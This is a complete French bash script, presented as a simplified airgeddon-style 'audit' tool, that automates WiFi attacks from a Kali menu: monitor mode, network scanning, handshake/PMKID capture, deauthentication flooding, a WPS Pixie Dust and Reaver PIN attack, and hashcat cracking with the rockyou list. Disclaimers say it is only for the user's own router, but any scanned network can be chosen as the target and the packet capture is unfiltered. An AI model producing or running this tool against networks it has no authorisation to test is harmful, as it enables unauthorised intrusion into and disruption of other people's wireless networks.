#!/bin/bash
# wifi-audit.sh — Outil d'audit WiFi (style airgeddon, simplifié) — POUR TON PROPRE ROUTEUR UNIQUEMENT
# Usage (Kali, en root) : bash wifi-audit.sh
# Menu : monitor mode, scan, capture handshake/PMKID, deauth, WPS, crack hashcat.
# Ne l'utilise que sur TON réseau (ZTE F680). Tester le WiFi d'un autre est illégal.
set -u
WORK=/tmp/wifi-audit
mkdir -p "$WORK"
cd "$WORK" || exit 1
STATE="$WORK/state.txt"
: > "$STATE"

# ---------- helpers ----------
say() { echo ""; echo "=== $1 ==="; }
need_root() {
  if [ "$(id -u)" != "0" ]; then echo "ERROR: lance ce script en root (sur Kali tu es déjà root)."; exit 1; fi
}
check_tools() {
  local missing=0
  for t in iw airmon-ng airodump-ng aireplay-ng hcxdumptool hcxpcapngtool hashcat python3; do
    command -v "$t" >/dev/null 2>&1 || missing=1
  done
  if [ "$missing" = "1" ]; then
    echo "Installation des outils (aircrack-ng, hcxtools, hashcat)..."
    apt update && apt install -y aircrack-ng hcxtools hashcat wordlists || { echo "Install échouée. Vérifie internet."; exit 1; }
  fi
  echo "Outils OK."
}
get_val() { grep "^$1=" "$STATE" 2>/dev/null | cut -d= -f2-; }
set_val() { grep -v "^$1=" "$STATE" 2>/dev/null > "$STATE.tmp"; echo "$1=$2" >> "$STATE.tmp"; mv "$STATE.tmp" "$STATE"; }

pick_iface() {
  local cur; cur=$(get_val IFACE)
  if [ -n "$cur" ] && iw dev 2>/dev/null | grep -q "$cur"; then echo "$cur"; return; fi
  echo "Cartes WiFi détectées :"
  for i in $(iw dev | awk '/Interface/{print $2}'); do
    local drv; drv=$(basename "$(readlink "/sys/class/net/$i/device/driver" 2>/dev/null)" 2>/dev/null || echo "?")
    echo " - $i (driver: $drv)"
    if [ "$drv" = "ath9k_htc" ]; then set_val IFACE "$i"; fi
  done
  local ifc; ifc=$(get_val IFACE)
  if [ -z "$ifc" ]; then ifc=$(iw dev | awk '/Interface/{print $2; exit}'); set_val IFACE "$ifc"; fi
  if [ -z "$ifc" ]; then echo "ERROR: aucune carte WiFi. Branche le TL-WN722N V1 et relance."; exit 1; fi
  echo "Carte utilisée : $ifc"
  echo "$ifc"
}
mon_iface() { get_val MON; }

mon_start() {
  say "Monitor mode ON"
  local ifc; ifc=$(pick_iface)
  local mon; mon=$(mon_iface)
  if [ -n "$mon" ] && iw dev 2>/dev/null | grep -q "$mon"; then echo "Déjà en monitor mode : $mon"; return; fi
  airmon-ng check kill >/dev/null 2>&1
  airmon-ng start "$ifc" >/dev/null 2>&1
  if iw dev 2>/dev/null | grep -q "${ifc}mon"; then
    set_val MON "${ifc}mon"
  else
    ip link set "$ifc" down 2>/dev/null
    iw "$ifc" set monitor control 2>/dev/null
    ip link set "$ifc" up 2>/dev/null
    set_val MON "$ifc"
  fi
  mon=$(mon_iface)
  if [ -z "$mon" ] || ! iw dev 2>/dev/null | grep -q "$mon"; then echo "ERROR: monitor mode impossible."; exit 1; fi
  echo "Monitor mode OK : $mon"
}
mon_stop() {
  say "Monitor mode OFF"
  local mon; mon=$(mon_iface)
  if [ -n "$mon" ]; then airmon-ng stop "$mon" >/dev/null 2>&1; fi
  set_val MON ""
  echo "Monitor mode arrêté. (Si internet est coupé : systemctl start NetworkManager)"
}

parse_scan() {
  python3 - "$WORK/scan-01.csv" <<'PYEOF'
import csv, sys
path = sys.argv[1]
nets = []
try:
    with open(path, newline='', encoding='utf-8', errors='ignore') as f:
        r = csv.reader(f)
        for row in r:
            if not row or row[0].strip() == 'BSSID':
                continue
            if row[0].strip() == 'Station MAC':
                break
            if len(row) < 14:
                continue
            bssid = row[0].strip()
            ch = row[3].strip()
            enc = row[5].strip()
            pwr = row[8].strip()
            ssid = row[13].strip()
            if bssid and ssid:
                nets.append((ssid, bssid, ch, enc, pwr))
except FileNotFoundError:
    pass
seen = set(); uniq = []
for n in nets:
    if (n[0], n[1]) in seen: continue
    seen.add((n[0], n[1])); uniq.append(n)
for i, (ssid, bssid, ch, enc, pwr) in enumerate(uniq, 1):
    print(f"{i}. {ssid} | {bssid} | canal {ch} | {enc} | signal {pwr}")
with open('/tmp/wifi-audit/nets.txt', 'w') as f:
    for ssid, bssid, ch, enc, pwr in uniq:
        f.write(f"{ssid}\t{bssid}\t{ch}\t{enc}\n")
if not uniq:
    print("(aucun réseau trouvé — la carte fonctionne ?)")
PYEOF
}

do_scan() {
  say "Scan des réseaux (15 secondes)"
  local mon; mon=$(mon_iface)
  if [ -z "$mon" ]; then echo "Active d'abord le monitor mode (option 1)."; return; fi
  rm -f "$WORK/scan-01.csv" "$WORK/nets.txt"
  timeout 15 airodump-ng --output-format csv -w "$WORK/scan" "$mon" >/dev/null 2>&1
  parse_scan
}

choose_target() {
  if [ ! -s "$WORK/nets.txt" ]; then echo "Lance d'abord le scan (option 2)."; return 1; fi
  echo ""
  read -p "Choisis ton WiFi (numéro) : " CHOICE
  local tgt; tgt=$(python3 - "$CHOICE" <<'PYEOF'
import sys
try: n = int(sys.argv[1])
except ValueError: print("NOTFOUND"); sys.exit()
lines = []
try:
    with open('/tmp/wifi-audit/nets.txt') as f:
        for line in f:
            p = line.rstrip('\n').split('\t')
            if len(p) >= 4: lines.append(p)
except FileNotFoundError: pass
if 1 <= n <= len(lines):
    ssid, bssid, ch, enc = lines[n-1]
    print(f"{bssid}\t{ch}\t{ssid}")
else:
    print("NOTFOUND")
PYEOF
)
  if [ "$tgt" = "NOTFOUND" ] || [ -z "$tgt" ]; then echo "Choix invalide."; return 1; fi
  set_val BSSID "$(echo "$tgt" | cut -f1)"
  set_val CHAN "$(echo "$tgt" | cut -f2)"
  set_val SSID "$(echo "$tgt" | cut -f3-)"
  echo "Cible : $(get_val SSID) | BSSID $(get_val BSSID) | canal $(get_val CHAN)"
  return 0
}

do_capture() {
  say "Capture handshake / PMKID (2 minutes)"
  local mon; mon=$(mon_iface)
  if [ -z "$mon" ]; then echo "Active d'abord le monitor mode (option 1)."; return; fi
  if [ -z "$(get_val BSSID)" ]; then choose_target || return; fi
  echo "Cible : $(get_val SSID) ($(get_val BSSID), canal $(get_val CHAN))"
  echo "Pendant la capture, reconnecte un appareil au WiFi (ex : WiFi du téléphone off/on)."
  rm -f "$WORK/cap.pcapng"
  timeout 120 hcxdumptool -i "$mon" -o "$WORK/cap.pcapng" --enable_status=1
  echo ""
  say "Conversion"
  rm -f "$WORK/hash.hc22000"
  hcxpcapngtool -o "$WORK/hash.hc22000" "$WORK/cap.pcapng" 2>/dev/null
  if [ ! -s "$WORK/hash.hc22000" ]; then
    echo "Rien capturé. Reconnecte un appareil et relance la capture (option 3),"
    echo "ou force une reconnexion avec la déauth (option 4)."
    return
  fi
  echo "Handshake/PMKID capturé ! Fichier : $WORK/hash.hc22000"
}

do_deauth() {
  say "Déauthentification (force un client à se reconnecter)"
  local mon; mon=$(mon_iface)
  if [ -z "$mon" ]; then echo "Active d'abord le monitor mode (option 1)."; return; fi
  if [ -z "$(get_val BSSID)" ]; then choose_target || return; fi
  echo "Cible : $(get_val SSID) ($(get_val BSSID), canal $(get_val CHAN))"
  echo "Envoie 5 paquets de déauth à tous les clients de CE réseau (ton réseau uniquement)."
  read -p "Confirmer ? (o/n) : " C
  [ "$C" = "o" ] || [ "$C" = "O" ] || { echo "Annulé."; return; }
  aireplay-ng --deauth 5 -a "$(get_val BSSID)" "$mon" 2>&1 | tail -3
  echo "Fait. Relance la capture (option 3) pour attraper le handshake."
}

do_wps() {
  say "Vérification WPS"
  local mon; mon=$(mon_iface)
  if [ -z "$mon" ]; then echo "Active d'abord le monitor mode (option 1)."; return; fi
  if ! command -v wash >/dev/null 2>&1; then
    echo "wash non installé. Installe reaver : apt install -y reaver"
    echo "En attendant : vérifie dans l'admin du routeur (192.168.1.1) si WPS est activé."
    echo "Si WPS est ON, c'est le vrai risque — désactive-le."
    return
  fi
  echo "Scan WPS (20 secondes) — cherche les routeurs avec WPS activé..."
  timeout 20 wash -i "$mon" 2>/dev/null || echo "(wash n'a rien trouvé ou a été interrompu)"
  echo ""
  echo "Si ton routeur apparaît avec WPS activé : désactive WPS dans 192.168.1.1."
}

do_wps_attack() {
  say "Attaque WPS (Pixie Dust / Reaver)"
  local mon; mon=$(mon_iface)
  if [ -z "$mon" ]; then echo "Active d'abord le monitor mode (option 1)."; return; fi
  if [ -z "$(get_val BSSID)" ]; then choose_target || return; fi
  echo "Cible : $(get_val SSID) ($(get_val BSSID), canal $(get_val CHAN))"
  if ! command -v wash >/dev/null 2>&1 || ! command -v reaver >/dev/null 2>&1; then
    echo "Installation de reaver + pixiewps..."
    apt update && apt install -y reaver pixiewps || { echo "Install échouée. Vérifie internet."; return; }
  fi
  echo ""
  echo "--- Scan WPS (20 secondes) : est-ce que WPS est activé ? ---"
  timeout 20 wash -i "$mon" 2>/dev/null | head -20
  echo ""
  echo "--- Pixie Dust (rapide si le routeur est vulnérable) ---"
  read -p "Lancer Pixie Dust sur $(get_val SSID) ? (o/n) : " C
  [ "$C" = "o" ] || [ "$C" = "O" ] || { echo "Annulé."; return; }
  reaver -i "$mon" -b "$(get_val BSSID)" -c "$(get_val CHAN)" -vv --pixie-dust 2>&1 | tee "$WORK/wps-pixie.log"
  echo ""
  echo "Si Pixie Dust a trouvé le PIN, le mot de passe WiFi s'affiche ci-dessus."
  echo "Sinon, reaver peut brute-forcer le PIN (très lent, risque de blocage WPS) :"
  echo "  reaver -i $mon -b $(get_val BSSID) -c $(get_val CHAN) -vv"
  echo "Log : $WORK/wps-pixie.log"
}

wordlist_path() {
  if [ -f /usr/share/wordlists/rockyou.txt ]; then echo /usr/share/wordlists/rockyou.txt; return; fi
  if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
    echo "Extraction de rockyou..."
    gzip -dc /usr/share/wordlists/rockyou.txt.gz > "$WORK/rockyou.txt"
    echo "$WORK/rockyou.txt"; return
  fi
  echo ""
}
do_crack() {
  say "Crack hashcat (rockyou)"
  if [ ! -s "$WORK/hash.hc22000" ]; then echo "Pas de handshake capturé. Fais d'abord la capture (option 3)."; return; fi
  local wl; wl=$(wordlist_path)
  if [ -z "$wl" ] || [ ! -f "$wl" ]; then echo "rockyou introuvable. Essaie : apt install -y wordlists"; return; fi
  echo "Crack en cours (CPU = lent, plusieurs heures possibles). Ctrl+C pour arrêter."
  hashcat -m 22000 "$WORK/hash.hc22000" "$wl" --potfile-path "$WORK/audit.pot" --status --status-timer=60 || echo "TIP: si hashcat dit 'No devices found', lance : apt install -y pocl"
  echo ""
  say "Résultat"
  hashcat -m 22000 "$WORK/hash.hc22000" "$wl" --show --potfile-path "$WORK/audit.pot" 2>/dev/null
  echo ""
  echo "(Si rien ne s'affiche : mot de passe NON trouvé dans rockyou = bon signe, il est fort.)"
}

show_target() {
  local ssid; ssid=$(get_val SSID)
  if [ -n "$ssid" ]; then echo "Cible : $ssid ($(get_val BSSID), canal $(get_val CHAN))"; else echo "Cible : (aucune — fais un scan puis choisis)"; fi
  local mon; mon=$(mon_iface)
  if [ -n "$mon" ]; then echo "Monitor : $mon (ON)"; else echo "Monitor : OFF"; fi
}

# ---------- main ----------
need_root
check_tools
echo ""
echo "##############################################"
echo "#  WiFi Audit — style airgeddon (simplifié)  #"
echo "#  POUR TON PROPRE ROUTEUR UNIQUEMENT         #"
echo "##############################################"
while true; do
  echo ""
  show_target
  echo ""
  echo "  1) Monitor mode ON"
  echo "  2) Scanner les réseaux"
  echo "  3) Capturer handshake / PMKID"
  echo "  4) Déauthentifier (forcer reconnexion)"
  echo "  5) Vérifier WPS"
  echo "  6) Attaque WPS (Pixie Dust / Reaver)"
  echo "  7) Cracker avec hashcat (rockyou)"
  echo "  8) Monitor mode OFF + quitter"
  echo ""
  read -p "Choix [1-8] : " CH
  case "$CH" in
    1) mon_start ;;
    2) do_scan ;;
    3) do_capture ;;
    4) do_deauth ;;
    5) do_wps ;;
    6) do_wps_attack ;;
    7) do_crack ;;
    8) mon_stop; echo "Fichiers dans $WORK"; exit 0 ;;
    *) echo "Choix invalide (1-8)." ;;
  esac
done
